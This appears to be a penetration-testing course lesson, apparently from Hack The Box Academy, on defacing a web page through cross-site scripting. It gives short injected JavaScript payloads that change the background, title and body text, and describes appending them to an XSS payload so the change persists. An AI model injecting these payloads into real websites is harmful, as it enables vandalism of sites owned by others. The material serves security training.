Defacing a website means changing his look for anyone who visits the website. Hackers may deface a website to claim a successful hack, like when hackers defaced the UK National Health Service (NHS) [back in 2018](https://www.bbc.co.uk/news/technology-43812539). Such attacks can significantly affect a company's investments and share prices.

## Defacement Elements

We can utilize injected JavaScript code to make a webpage look any way we like.

Three HTML elements are usually utilized to change the main look of a web page:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

We can utilize two or three of these elements to write a basic message to the web page and even remove the vulnerable element, such that it would be more difficult to quickly reset the web page, as we will see next.

## Changing Background

To change the background we can use a certain color or an image:
```html
<script>document.body.style.background = "#141d2b"</script>
```

Tip: Here we set the background color to the default Hack The Box background color. We can use any other hex value, or can use a named color like `= "black"`.

Another option would be to set an image to the background using the following payload:
```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

## Changing Page Title

We can change the page title to any title we want:
```html
<script>document.title = 'HackTheBox Academy'</script>
```

## Changing Page Text

we can change the text of a specific HTML element/DOM using the `innerHTML` function:
```javascript
document.getElementById("todo").innerHTML = "New Text"
```

We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the `jQuery` library must have been imported within the page source):
```javascript
$("#todo").html('New Text');
```

We can also change the entire HTML code of the main body:
```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

`[0]` is for the first body element. We may also use jQuery for the same thing. Before making a permanent change, we should prepare our HTML code separately.

**Tip:** It would be wise to try running our HTML code locally to see how it looks and to ensure that it runs as expected, before we commit to it in our final payload.

We will minify the HTML code into a single line and add it to our previous XSS payload.

Our injected payload will appear at the end of the source code.